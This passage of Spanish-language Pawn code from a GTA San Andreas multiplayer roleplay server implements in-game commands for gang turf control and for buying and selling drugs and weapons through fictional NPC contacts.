		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);
		TurfInfo[turf][tDrogaVendida][2] += cantidad;
		return 1;
	}
	
	if(strcmp(opcion,"heroina",true) == 0) //Vende heroina en el turf
	{
		if(TurfInfo[turf][tDrogaVendida][3] > 0)
	    {
	        format(string, sizeof(string), "* Ya han vendido este tipo de droga aquí recientemente. Debes esperar %d horas.", TurfInfo[turf][tDrogaVendida][3]);
	        SendClientMessage(playerid, Rojo, string);
	        return 1;
	    }
	    if(PlayerInfo[playerid][pManoDer] != 78 && PlayerInfo[playerid][pManoIzq] != 78){SendClientMessage(playerid, Rojo, "* No tienes un fardo de marihuana en ninguna mano."); return 1;}
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
	 	{
			SendClientMessage(playerid, Naranja, "* /Distribuir Heroina [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
		if(cantidad > PlayerInfo[playerid][pManoDerCant] && cantidad > PlayerInfo[playerid][pManoIzqCant]){SendClientMessage(playerid, Rojo, "* No hay tanta cantidad de droga en el fardo."); return 1;}

		if(PlayerInfo[playerid][pManoDer] == 78 && cantidad <= PlayerInfo[playerid][pManoDerCant])
		{
		    PlayerInfo[playerid][pManoDerCant] -= cantidad;
		}
		else if(PlayerInfo[playerid][pManoIzq] == 78 && cantidad <= PlayerInfo[playerid][pManoIzqCant])
		{
		    PlayerInfo[playerid][pManoIzqCant] -= cantidad;
		}
		new dinero = 75*cantidad*porcentaje/100;
		GivePlayerMoneyAC(playerid, dinero);
		switch(TurfInfo[turf][tNivel])
		{
		    case 1: format(string, sizeof(string), "Camello: No creo que se vaya a vender bien... Toma %d pavos.", dinero);
		    case 2: format(string, sizeof(string), "Camello: Tengo familia a la que alimentar tío, solo te puedo dar %d$.", dinero);
			case 3: format(string, sizeof(string), "Camello: Sigue trayéndome mierda de esta, se vende bien, toma %d$ por ella.", dinero);
			case 4: format(string, sizeof(string), "Camello: Aquí mandas tú, toma %d$.", dinero);
		}
		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);
		TurfInfo[turf][tDrogaVendida][3] += cantidad;
		return 1;
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/dpintar", true) == 0) //Deja pintar (misión pandillas pintar)
{
	if(MuroAPintar[playerid] == NOEXISTE){SendClientMessage(playerid, Rojo, "* No estás pintando ningún graffiti."); return 1;}
	if(MuroAPintar[playerid] != NOEXISTE && RealizandoMision[playerid] != 0){SendClientMessage(playerid, Rojo, "* No estás pintando ningún graffiti."); return 1;}
	MuroAPintar[playerid] = NOEXISTE;
	ClearAnimations(playerid, 1);
	TogglePlayerControllable(playerid, 1);
	SendClientMessage(playerid, Amarillo, "SMS de Nº oculto: Vaya cagada... Recuérdame que te no te vuelva a llamar para estas cosas.");
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/turf", true) == 0) //Comando para pandillas/bandas para gangzones
{
	new faccion = PlayerInfo[playerid][pFaccion];
    if(faccion == 0){SendClientMessage(playerid, Rojo, "* No formas parte de una facción."); return 1;}
    if(FaccInfo[faccion][fTipo] != 3){SendClientMessage(playerid, Rojo, "* No formas parte de una banda o pandilla."); return 1;}
    if(PlayerInfo[playerid][pRango] < 7){SendClientMessage(playerid, Rojo, "* Necesitas tener rango igual o superior a 7 en tu facción para utilizar este comando."); return 1;}

	new opcion[30];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Turf [Opción] ");
		SendClientMessage(playerid, Naranja, "Influenciar (-12 pts), Conquistar (-36 pts), Atacar (-24 pts), Desinfluenciar (+8 pts)");
		format(string, sizeof(string), "Puntos de expansión de tu facción: %d pts.", FaccInfo[faccion][fPuntosExpansion]);
		SendClientMessage(playerid, Amarillo, string);
		return 1;
	}
	
	if(!GetPlayerTurf(playerid)){SendClientMessage(playerid, Rojo, "* No estás en ningún turf."); return 1;}
 	new turfid = GetPlayerTurf(playerid);
	
	for(new x = 0; x<=TotalTurfs; x++)
	{
	    if(TurfInfo[x][tAtacante] == faccion){SendClientMessage(playerid,Rojo,"* No usar este comando si tu facción está atacando o conquistando un turf."); return 1;}
	}
	
	for(new x = 0; x<=TotalTurfs; x++)
	{
	    if(TurfInfo[x][tFaccion] == faccion && TurfInfo[x][tAtacante] != 0){SendClientMessage(playerid,Rojo,"* No usar este comando si están atacando o conquistando un turf de tu facción."); return 1;}
	}

 	
	if(strcmp(opcion,"influenciar",true) == 0) //Colonizar un turf o subirlo de nivel
	{
 		if(FaccInfo[faccion][fPuntosExpansion] < 12){SendClientMessage(playerid, Rojo ,"* Tu facción necesita tener al menos 12 puntos de expansión para aumentar su influencia. Espera unas horas."); return 1;}
	    if(TurfInfo[turfid][tFaccion] != 0 && TurfInfo[turfid][tFaccion] != faccion) //Si el turf ya pertenece a una facción
		{
			SendClientMessage(playerid,Rojo,"* Este turf ya pertenece a una facción.");
			SendClientMessage(playerid,Rojo,"* Utiliza '/Turf Conquistar' o '/Turf Atacar' si quieres anexionarlo.");
			return 1;
		}
		if(TurfInfo[turfid][tAtacante] != 0){SendClientMessage(playerid,Rojo,"* No puedes usar este comando en un turf que está siendo atacado o conquistado."); return 1;}
		if(TurfInfo[turfid][tFaccion] == 0) //Si el turf no tiene dueño
		{
			new turfadyacente;
		    for(new x = 0; x<=TotalTurfs; x++)
		    {
		        if(x != turfid && TurfInfo[x][tFaccion] == faccion && TurfInfo[x][tNivel] >= 2)
		        {
		        	if( ((TurfInfo[turfid][tMinX] > TurfInfo[x][tMinX] && TurfInfo[turfid][tMinX] < TurfInfo[x][tMaxX]) || (TurfInfo[turfid][tMaxX] < TurfInfo[x][tMaxX] && TurfInfo[turfid][tMaxX] > TurfInfo[x][tMinX]) || (TurfInfo[turfid][tMinX] <= TurfInfo[x][tMinX] && TurfInfo[turfid][tMaxX] >= TurfInfo[x][tMaxX])) && (TurfInfo[turfid][tMinY] == TurfInfo[x][tMaxY] || TurfInfo[turfid][tMaxY] == TurfInfo[x][tMinY]) ){turfadyacente = x; break;}
		        	else if( ((TurfInfo[turfid][tMinY] > TurfInfo[x][tMinY] && TurfInfo[turfid][tMinY] < TurfInfo[x][tMaxY]) || (TurfInfo[turfid][tMaxY] < TurfInfo[x][tMaxY] && TurfInfo[turfid][tMaxY] > TurfInfo[x][tMinY]) || (TurfInfo[turfid][tMinY] <= TurfInfo[x][tMinY] && TurfInfo[turfid][tMaxY] >= TurfInfo[x][tMaxY])) && (TurfInfo[turfid][tMinX] == TurfInfo[x][tMaxX] || TurfInfo[turfid][tMaxX] == TurfInfo[x][tMinX]) ){turfadyacente = x; break;}
		        }
		    }
		    if(turfadyacente == 0){SendClientMessage(playerid,Rojo,"* Este turf no es adyacente a un turf de tu facción con influencia igual o superior a 2."); return 1;}
		    new cuentaturf;
		    for(new x = 0; x<=TotalTurfs; x++)
		    {
		        if(TurfInfo[x][tFaccion] == faccion) cuentaturf ++;
		    }
		    if(cuentaturf >= 6){SendClientMessage(playerid,Rojo,"* Actualmente solo se permiten 6 turfs por facción."); return 1;}
		    TurfInfo[turfid][tFaccion] = faccion;
		    TurfInfo[turfid][tNivel] = 1;
		    ActualizarTurf(turfid);
		    SendClientMessage(playerid, Amarillo, "* Tu facción ha expandido su influencia a este turf.");
		    SendClientMessage(playerid, Amarillo, "* Tu facción pierde 12 puntos de expansión por esta acción.");
		    FaccInfo[faccion][fPuntosExpansion] -= 12;
		    return 1;
		}
		if(TurfInfo[turfid][tFaccion] == faccion) //Si el turf ya pertenece a la facción del jugador
		{
		    if(TurfInfo[turfid][tNivel] >= 3){SendClientMessage(playerid,Rojo,"* Solo puedes tener un turf de influencia superior a 3 (tu turf principal)."); return 1;}
		    TurfInfo[turfid][tNivel] ++;
		    ActualizarTurf(turfid);
		    format(string, sizeof(string), "* Tu facción ha aumentado su influencia en este turf al nivel %d.", TurfInfo[turfid][tNivel]);
			SendClientMessage(playerid, Amarillo, string);
			SendClientMessage(playerid, Amarillo, "* Tu facción pierde 12 puntos de expansión por esta acción.");
			FaccInfo[faccion][fPuntosExpansion] -= 12;
		    return 1;
		}
	}
	
	if(strcmp(opcion,"conquistar",true) == 0) //Conquistar un turf
	{
 		if(FaccInfo[faccion][fPuntosExpansion] < 36){SendClientMessage(playerid, Rojo ,"* Tu facción necesita tener al menos 36 puntos de expansión para conquistar un turf. Espera unas horas."); return 1;}
	    if(TurfInfo[turfid][tFaccion] == faccion) //Si el turf pertenece a su facción
		{
			SendClientMessage(playerid,Rojo,"* No puedes conquistar un turf que ya pertenece a tu facción.");
			SendClientMessage(playerid,Rojo,"* Utiliza '/Turf Influenciar' si quieres aumentar la influencia de tu facción sobre él.");
			return 1;
		}
		else if(TurfInfo[turfid][tFaccion] == 0) //Si el turf no tiene dueño
		{
			SendClientMessage(playerid,Rojo,"* No puedes conquistar un turf que no pertenece a ninguna facción.");
			SendClientMessage(playerid,Rojo,"* Utiliza '/Turf Influenciar' si quieres aumentar la influencia de tu facción sobre él.");
			return 1;
		}
		else //El turf pertenece a otra facción
		{
			new turfadyacente;
		    for(new x = 0; x<=TotalTurfs; x++)
		    {
		        if(x != turfid && TurfInfo[x][tFaccion] == faccion)
		        {
		        	if( ((TurfInfo[turfid][tMinX] > TurfInfo[x][tMinX] && TurfInfo[turfid][tMinX] < TurfInfo[x][tMaxX]) || (TurfInfo[turfid][tMaxX] < TurfInfo[x][tMaxX] && TurfInfo[turfid][tMaxX] > TurfInfo[x][tMinX]) || (TurfInfo[turfid][tMinX] <= TurfInfo[x][tMinX] && TurfInfo[turfid][tMaxX] >= TurfInfo[x][tMaxX])) && (TurfInfo[turfid][tMinY] == TurfInfo[x][tMaxY] || TurfInfo[turfid][tMaxY] == TurfInfo[x][tMinY]) ){turfadyacente = x; break;}
		        	else if( ((TurfInfo[turfid][tMinY] > TurfInfo[x][tMinY] && TurfInfo[turfid][tMinY] < TurfInfo[x][tMaxY]) || (TurfInfo[turfid][tMaxY] < TurfInfo[x][tMaxY] && TurfInfo[turfid][tMaxY] > TurfInfo[x][tMinY]) || (TurfInfo[turfid][tMinY] <= TurfInfo[x][tMinY] && TurfInfo[turfid][tMaxY] >= TurfInfo[x][tMaxY])) && (TurfInfo[turfid][tMinX] == TurfInfo[x][tMaxX] || TurfInfo[turfid][tMaxX] == TurfInfo[x][tMinX]) ){turfadyacente = x; break;}
		        }
		    }
		    if(turfadyacente == 0){SendClientMessage(playerid,Rojo,"* Este turf no es adyacente a un turf de tu facción."); return 1;}
		    new cuentaturf;
		    for(new x = 0; x<=TotalTurfs; x++)
		    {
		        if(TurfInfo[x][tFaccion] == faccion) cuentaturf ++;
		    }
		    if(cuentaturf >= 6){SendClientMessage(playerid,Rojo,"* Actualmente solo se permiten 6 turfs por facción."); return 1;}
		    if(TurfInfo[turfid][tNivel] > 1)
			{
				SendClientMessage(playerid,Rojo,"* Solo puedes conquistar turfs de otras facciones con nivel de influencia 1.");
				SendClientMessage(playerid,Rojo,"* Utiliza '/Turf Atacar' para reducir la influencia de esa facción en este turf.");
				return 1;
			}
			new miembrocuenta;
			for(new i = 0; i<MAX_PLAYERS; i++)
			{
			    if(PlayerInfo[i][pFaccion] == TurfInfo[turfid][tFaccion] && PlayerInfo[i][pEncarcelado] == 0) miembrocuenta++;
			}
			if(miembrocuenta < 3){SendClientMessage(playerid,Rojo,"* Deben estar conectados al menos 3 miembros de la facción de este turf para poder conquistarlo."); return 1;}

			new atacantesenturf;
			for(new i = 0; i<MAX_PLAYERS; i++)
			{
				if(IsPlayerInDynamicArea(i, TurfInfo[turfid][tArea])) atacantesenturf ++;
			}
            if(atacantesenturf < 3){SendClientMessage(playerid,Rojo,"* Deben estar al menos 3 miembros de tu facción en este turf para poder conquistarlo."); return 1;}

            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Están intentando conquistar nuestro territorio.");
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: No podemos permitir que nos echen de allí.");
            for(new i = 0; i<MAX_PLAYERS; i++)
			{
			    if(PlayerInfo[i][pFaccion] == TurfInfo[turfid][tFaccion])
			    {
			        SetPlayerMapIcon(i, 1, (TurfInfo[turfid][tMinX]+TurfInfo[turfid][tMaxX])/2, (TurfInfo[turfid][tMinY]+TurfInfo[turfid][tMaxY])/2, 0, 18, 0xFFFFFFFF, MAPICON_GLOBAL);
			    }
			}
			
		    format(string, sizeof(string), "SMS de Nº oculto: Estamos conquistando un turf de %s.", FaccInfo[TurfInfo[turfid][tFaccion]][fNombre]);
			SendFaccionMessage(faccion, Amarillo, string);
			SendFaccionMessage(faccion, Amarillo, "SMS de Nº oculto: Tenemos que aguantar allí el máximo tiempo posible.");
		    TurfInfo[turfid][tAtacante] = faccion;
		    ActualizarTurf(turfid);

		    SetTimerEx("AtacarTurf", 240000, false, "d, d", turfid, 2);

		    SendClientMessage(playerid, Amarillo, "* Tu facción pierde 36 puntos de expansión por esta acción.");
		    FaccInfo[faccion][fPuntosExpansion] -= 36;
		    return 1;
		}
	}
	
	if(strcmp(opcion,"atacar",true) == 0) //Atacar un turf
	{
 		if(FaccInfo[faccion][fPuntosExpansion] < 24){SendClientMessage(playerid, Rojo ,"* Tu facción necesita tener al menos 24 puntos de expansión para conquistar un turf. Espera unas horas."); return 1;}
	    if(TurfInfo[turfid][tFaccion] == faccion) //Si el turf pertenece a su facción
		{
			SendClientMessage(playerid,Rojo,"* No puedes atacar un turf que ya pertenece a tu facción.");
			SendClientMessage(playerid,Rojo,"* Utiliza '/Turf Influenciar' si quieres aumentar la influencia de tu facción sobre él.");
			return 1;
		}
		else if(TurfInfo[turfid][tFaccion] == 0) //Si el turf no tiene dueño
		{
			SendClientMessage(playerid,Rojo,"* No puedes atacar un turf que no pertenece a ninguna facción.");
			SendClientMessage(playerid,Rojo,"* Utiliza '/Turf Influenciar' si quieres aumentar la influencia de tu facción sobre él.");
			return 1;
		}
		else //El turf pertenece a otra facción
		{
		    if(TurfInfo[turfid][tNivel] >= 4){SendClientMessage(playerid,Rojo,"* No puedes atacar el turf principal de una facción."); return 1;}
			if(TurfInfo[turfid][tNivel] <= 1){SendClientMessage(playerid,Rojo,"* No puedes atacar un turf de influencia nivel 1."); return 1;}
			new miembrocuenta;
			for(new i = 0; i<MAX_PLAYERS; i++)
			{
			    if(PlayerInfo[i][pFaccion] == TurfInfo[turfid][tFaccion] && PlayerInfo[i][pEncarcelado] == 0) miembrocuenta++;
			}
			if(miembrocuenta < 3){SendClientMessage(playerid,Rojo,"* Deben estar conectados al menos 3 miembros de la facción de este turf para poder atacarlo."); return 1;}

			new atacantesenturf;
			for(new i = 0; i<MAX_PLAYERS; i++)
			{
				if(IsPlayerInDynamicArea(i, TurfInfo[turfid][tArea])) atacantesenturf ++;
			}
            if(atacantesenturf < 3){SendClientMessage(playerid,Rojo,"* Deben estar al menos 3 miembros de tu facción en este turf para comenzar un ataque."); return 1;}
            
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Están atacando nuestro territorio.");
            SendFaccionMessage(TurfInfo[turfid][tFaccion], Amarillo, "SMS de Nº oculto: Moved el culo hasta allí y defendedlo como sea.");
            for(new i = 0; i<MAX_PLAYERS; i++)
			{
			    if(PlayerInfo[i][pFaccion] == TurfInfo[turfid][tFaccion])
			    {
			        SetPlayerMapIcon(i, 1, (TurfInfo[turfid][tMinX]+TurfInfo[turfid][tMaxX])/2, (TurfInfo[turfid][tMinY]+TurfInfo[turfid][tMaxY])/2, 0, 18, 0xFFFFFFFF, MAPICON_GLOBAL);
			    }
			}
			
			format(string, sizeof(string), "SMS de Nº oculto: Estamos atacando un turf de %s.", FaccInfo[TurfInfo[turfid][tFaccion]][fNombre]);
			SendFaccionMessage(faccion, Amarillo, string);
			SendFaccionMessage(faccion, Amarillo, "SMS de Nº oculto: Tenemos que aguantar allí el máximo tiempo posible.");
		    TurfInfo[turfid][tAtacante] = faccion;
		    ActualizarTurf(turfid);
		    
		    SetTimerEx("AtacarTurf", 240000, false, "d, d", turfid, 1);

		    SendClientMessage(playerid, Amarillo, "* Tu facción pierde 24 puntos de expansión por esta acción.");
		    FaccInfo[faccion][fPuntosExpansion] -= 24;
		    return 1;
		}
	}
	
	if(strcmp(opcion,"desinfluenciar",true) == 0) //Colonizar un turf o subirlo de nivel
	{
		if(TurfInfo[turfid][tFaccion] != faccion){SendClientMessage(playerid,Rojo,"* Este turf no es de tu facción."); return 1;}
		if(TurfInfo[turfid][tNivel] >= 4){SendClientMessage(playerid,Rojo,"* No puedes desinfluenciar tu turf principal."); return 1;}
		if(TurfInfo[turfid][tAtacante] != 0){SendClientMessage(playerid,Rojo,"* No puedes usar este comando en un turf que está siendo atacado o conquistado."); return 1;}
		if(TurfInfo[turfid][tNivel] == 1)
		{
		    TurfInfo[turfid][tFaccion] = 0;
		    ActualizarTurf(turfid);
		    SendClientMessage(playerid, Amarillo, "* Tu facción ha abandonado por completo este turf.");
		    SendClientMessage(playerid, Amarillo, "* Tu facción gana 8 puntos de expansión por esta acción.");
			FaccInfo[faccion][fPuntosExpansion] += 8;
		    return 1;
		}
		TurfInfo[turfid][tNivel] --;
		if(TurfInfo[turfid][tNivel] < 1) TurfInfo[turfid][tNivel] = 1;
		ActualizarTurf(turfid);
        format(string, sizeof(string), "* Tu facción ha reducido su influencia en este turf al nivel %d.", TurfInfo[turfid][tNivel]);
		SendClientMessage(playerid, Amarillo, string);
		SendClientMessage(playerid, Amarillo, "* Tu facción gana 8 puntos de expansión por esta acción.");
		FaccInfo[faccion][fPuntosExpansion] += 8;
        return 1;
	}
	
	else
	{
		SendClientMessage(playerid, Naranja, "* /Turf [Opción] ");
		SendClientMessage(playerid, Naranja, "Influenciar, Conquistar, Atacar, Desinfluenciar");
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/contactodrogas", true) == 0) //Comando para comprar drogas
{
    if(FaccInfo[PlayerInfo[playerid][pFaccion]][fTipo] != 4){SendClientMessage(playerid,Rojo,"* No formas parte de una mafia."); return 1;}
    if(PlayerInfo[playerid][pRango] < 7){SendClientMessage(playerid,Rojo,"* Debes tener al menos rango 7 para usar este comando."); return 1;}
    if(FaccInfo[PlayerInfo[playerid][pFaccion]][fTiempoDrogas] > 0)
    {
        format(string, sizeof(string), "* Tu facción ya ha comprado drogas recientemente. Debes esperar %d horas.", FaccInfo[PlayerInfo[playerid][pFaccion]][fTiempoDrogas]);
        SendClientMessage(playerid, Rojo, string);
        return 1;
    }
    new policonectado;
    for(new x=0; x<MAX_PLAYERS; x++)
    {
        if(IsPlayerConnected(x) && x != INVALID_PLAYER_ID && PlayerInfo[x][pFaccion] == 1){policonectado ++;}
	}
    if(policonectado < 2){SendClientMessage(playerid, Rojo, "* Debe haber al menos dos policías conectado de servicio para usar este comando."); return 1;}
    if(!IsPlayerInRangeOfPoint(playerid, 25.0, -1744.2081,161.1686,3.2562)){SendClientMessage(playerid,Rojo,"* No estás en el puerto de San Fierro."); return 1;}
	new opcion[30];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /ContactoDrogas [Droga] [Cantidad]");
  		SendClientMessage(playerid, Naranja, "Cocaina (30$/gr), Heroina (40$/gr), LSD (10$/gr)");
		return 1;
	}
	
	if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid,Rojo,"* Tienes ambas manos ocupadas."); return 1;}

	if(strcmp(opcion,"cocaina",true) == 0) //Compra cocaína
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
	 	{
			SendClientMessage(playerid, Naranja, "* /ContactoDrogas Cocaina [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		if(cantidad < 20 || cantidad > 70){SendClientMessage(playerid,Rojo,"* La cantidad debe estar entre 20 y 70."); return 1;}
		new dinero = 30*cantidad;
		if(GetPlayerMoney(playerid) < dinero){SendClientMessage(playerid,Rojo,"* No tienes suficiente dinero."); return 1;}
		if(PlayerInfo[playerid][pManoDer] == 0)
		{
		    PlayerInfo[playerid][pManoDer] = 76, PlayerInfo[playerid][pManoDerCant] = cantidad;
		    PonerObjeto(playerid, 1, 76);
		}
		else if(PlayerInfo[playerid][pManoIzq] == 0)
		{
		    PlayerInfo[playerid][pManoIzq] = 76, PlayerInfo[playerid][pManoIzqCant] = cantidad;
		    PonerObjeto(playerid, 2, 76);
		}
		GivePlayerMoneyAC(playerid, -dinero);
		format(string, sizeof(string), "Desconocido: %d gramos de cocaína por %d$. Recuerda no meterte tu propia mierda.", cantidad, dinero);
		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);
		
		if(AvisoLSPDCompraDrogas <= 0)
		{
		    SendRadioMessage(1, AguamarinaOscuro, "[Radio] Central: Hay rumores de que intentan introducir un cargamento de drogas en la ciudad.");
		    AvisoLSPDCompraDrogas = 15;
		}
		
		SetTimerEx("AsignarTiempoCompraMafias", 600000, false, "d, d", PlayerInfo[playerid][pFaccion], 2);
		return 1;
	}
	
	if(strcmp(opcion,"heroina",true) == 0) //Compra heroina
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
	 	{
			SendClientMessage(playerid, Naranja, "* /ContactoDrogas Heroina [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		if(cantidad < 20 || cantidad > 70){SendClientMessage(playerid,Rojo,"* La cantidad debe estar entre 20 y 70."); return 1;}
		new dinero = 40*cantidad;
		if(GetPlayerMoney(playerid) < dinero){SendClientMessage(playerid,Rojo,"* No tienes suficiente dinero."); return 1;}
		if(PlayerInfo[playerid][pManoDer] == 0)
		{
		    PlayerInfo[playerid][pManoDer] = 78, PlayerInfo[playerid][pManoDerCant] = cantidad;
		    PonerObjeto(playerid, 1, 78);
		}
		else if(PlayerInfo[playerid][pManoIzq] == 0)
		{
		    PlayerInfo[playerid][pManoIzq] = 78, PlayerInfo[playerid][pManoIzqCant] = cantidad;
		    PonerObjeto(playerid, 2, 78);
		}
		GivePlayerMoneyAC(playerid, -dinero);
		format(string, sizeof(string), "Desconocido: %d gramos de heroina por %d$. Recuerda no meterte tu propia mierda.", cantidad, dinero);
		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);

		if(AvisoLSPDCompraDrogas <= 0)
		{
		    SendRadioMessage(1, AguamarinaOscuro, "[Radio] Central: Hay rumores de que intentan introducir un cargamento de drogas en la ciudad.");
		    AvisoLSPDCompraDrogas = 15;
		}
		
		SetTimerEx("AsignarTiempoCompraMafias", 600000, false, "d, d", PlayerInfo[playerid][pFaccion], 2);
		return 1;
	}
	
	if(strcmp(opcion,"lsd",true) == 0) //Compra LSD
	{
	    tmp = strtok(cmdtext, idx);
		if(!strlen(tmp))
	 	{
			SendClientMessage(playerid, Naranja, "* /ContactoDrogas LSD [Cantidad]");
			return 1;
		}
		new cantidad = strval(tmp);
		if(cantidad < 20 || cantidad > 70){SendClientMessage(playerid,Rojo,"* La cantidad debe estar entre 20 y 70."); return 1;}
		new dinero = 10*cantidad;
		if(GetPlayerMoney(playerid) < dinero){SendClientMessage(playerid,Rojo,"* No tienes suficiente dinero."); return 1;}
		if(PlayerInfo[playerid][pManoDer] == 0)
		{
		    PlayerInfo[playerid][pManoDer] = 79, PlayerInfo[playerid][pManoDerCant] = cantidad;
		    PonerObjeto(playerid, 1, 79);
		}
		else if(PlayerInfo[playerid][pManoIzq] == 0)
		{
		    PlayerInfo[playerid][pManoIzq] = 79, PlayerInfo[playerid][pManoIzqCant] = cantidad;
		    PonerObjeto(playerid, 2, 79);
		}
		GivePlayerMoneyAC(playerid, -dinero);
		format(string, sizeof(string), "Desconocido: %d gramos de LSD por %d$. Espero que no den malos viajes.", cantidad, dinero);
		ProxDetector(15.0, playerid,string,Chat1,Chat2,Chat3,Chat4,Chat5);

		if(AvisoLSPDCompraDrogas <= 0)
		{
		    SendRadioMessage(1, AguamarinaOscuro, "[Radio] Central: Hay rumores de que intentan introducir un cargamento de drogas en la ciudad.");
		    AvisoLSPDCompraDrogas = 15;
		}
		
		SetTimerEx("AsignarTiempoCompraMafias", 600000, false, "d, d", PlayerInfo[playerid][pFaccion], 2);
		return 1;
	}
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd, "/contactoarmas", true) == 0) //Comando para comprar armamento
{
	if(FaccInfo[PlayerInfo[playerid][pFaccion]][fTipo] != 4){SendClientMessage(playerid,Rojo,"* No formas parte de una mafia."); return 1;}
    if(PlayerInfo[playerid][pRango] < 7){SendClientMessage(playerid,Rojo,"* Debes tener al menos rango 7 para usar este comando."); return 1;}
    if(FaccInfo[PlayerInfo[playerid][pFaccion]][fTiempoArmas] > 0)
    {
        format(string, sizeof(string), "* Tu facción ya ha comprado armas recientemente. Debes esperar %d horas.", FaccInfo[PlayerInfo[playerid][pFaccion]][fTiempoArmas]);
        SendClientMessage(playerid, Rojo, string);
        return 1;
    }
    new policonectado;
    for(new x=0; x<MAX_PLAYERS; x++)
    {
        if(IsPlayerConnected(x) && x != INVALID_PLAYER_ID && PlayerInfo[x][pFaccion] == 1){policonectado ++;}
    }
    if(policonectado < 2){SendClientMessage(playerid, Rojo, "* Debe haber al menos dos policías conectado de servicio para usar este comando."); return 1;}
    if(!IsPlayerInRangeOfPoint(playerid, 25.0, -1744.2081,161.1686,3.2562) && !IsPlayerInRangeOfPoint(playerid, 25.0, 2803.7034,970.4707,10.7500)){SendClientMessage(playerid,Rojo,"* No estás en el puerto de San Fierro ni en el almacén de Las Venturas."); return 1;}
    if(!GetPlayerVehicleID(playerid)){SendClientMessage(playerid,Rojo,"* Debes conducir un vehículo privado para usar este comando."); return 1;}
    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER){SendClientMessage(playerid,Rojo,"* Debes conducir un vehículo privado para usar este comando."); return 1;}
	if(GetPlayerVehicleID(playerid) <= MAX_VEHPUBLICO){SendClientMessage(playerid,Rojo,"* Debes conducir un vehículo privado para usar este comando."); return 1;}
	new carid = GetPlayerVehicleID(playerid), maleterolibre;
	if(!PlayerTieneLlaveVeh(playerid, carid)){SendClientMessage(playerid,Rojo,"* No puedes abrir el maletero de este vehículo."); return 1;}
	for(new x=0; x<CarInfo[carid][cMaxMaletero]; x++)
	{
	    if(CarInfo[carid][cMaletero][x] == 0){maleterolibre = 1; break;}
	}
	if(maleterolibre == 0){SendClientMessage(playerid,Rojo,"* No queda espacio en el maletero de este vehículo."); return 1;}
	ProxDetector(15.0, playerid,"Desconocido: ¿Qué necesitas esta vez?",Chat1,Chat2,Chat3,Chat4,Chat5);
	new dialog[1024];
	format(string, sizeof(string), "\nKatana x3 (%d$)", PreciosContactoArmas[0]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nM1911 x7 (%d$)", PreciosContactoArmas[1]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nCargador M1911 x7 (%d$)", PreciosContactoArmas[2]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nMunición .45 ACP x4 (%d$)", PreciosContactoArmas[3]);
	strcat(dialog, string);
 	format(string, sizeof(string), "\nD. Eagle x5 (%d$)", PreciosContactoArmas[4]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nCargador D. Eagle x5 (%d$)", PreciosContactoArmas[5]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nMunición .50 AE x2 (%d$)", PreciosContactoArmas[6]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nTec-9 x5 (%d$)", PreciosContactoArmas[7]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nCargador Tec-9 x5 (%d$)", PreciosContactoArmas[8]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nUZI x5 (%d$)", PreciosContactoArmas[9]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nCargador UZI x5 (%d$)", PreciosContactoArmas[10]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nMP5 x5 (%d$)", PreciosContactoArmas[11]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nCargador MP5 x5 (%d$)", PreciosContactoArmas[12]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nMunición SMG x3 (%d0$)", PreciosContactoArmas[13]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nEscopeta x3 (%d$)", PreciosContactoArmas[14]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nEscopeta recortada x4 (%d$)", PreciosContactoArmas[15]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nMunición 12GA x2 (%d$)", PreciosContactoArmas[16]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nAk-47 x3 (%d$)", PreciosContactoArmas[17]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nCargador Ak-47 x3 (%d$)", PreciosContactoArmas[18]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nMunición Ak-47 x2 (%d$)", PreciosContactoArmas[19]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nRifle x3 (%d$)", PreciosContactoArmas[20]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nCargador Rifle x3 (%d$)", PreciosContactoArmas[21]);
	strcat(dialog, string);
	format(string, sizeof(string), "\nMunición Rifle x2 (%d$)", PreciosContactoArmas[22]);
	strcat(dialog, string);
	
	ShowPlayerDialog(playerid, 23, DIALOG_STYLE_LIST, "Contacto de armas", dialog, "Seleccionar", "Cerrar");
    
	return 1;
}

